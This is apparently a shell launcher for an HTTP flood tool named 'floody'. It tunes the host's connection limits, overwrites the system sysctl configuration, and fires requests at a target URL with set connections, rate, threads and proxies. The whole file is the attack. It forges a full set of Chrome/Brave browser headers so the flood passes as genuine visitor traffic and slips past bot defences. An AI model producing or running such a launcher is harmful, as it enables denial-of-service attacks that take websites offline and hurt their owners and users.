ulimit -n 999999
chmod +x floody
echo "524288" > /sys/module/nf_conntrack/parameters/hashsize
cp sysctl.conf /etc/sysctl.conf
sysctl -p
#<url> <conns> <rate> <threads>
./floody -k samurai -u $1 -n $2 -r $3 -t $4 -p $5 \
 -h 'sec-ch-ua@" "Chromium";v="112", "Brave";v="112", "Not:A-Brand";v="99"' \
 -h sec-ch-ua-mobile@?0 \
 -h 'sec-ch-ua-platform@"Windows"' \
 -h upgrade-insecure-requests@1 \
 -h 'user-agent@Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
 -h 'accept@text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
 -h sec-fetch-site@none \
 -h sec-fetch-mode@navigate \
 -h sec-fetch-user@?1 \
 -h sec-fetch-dest@document \
 -h 'accept-encoding@gzip, deflate, br' \
 -h 'accept-language@en-US,en;q=0.9'
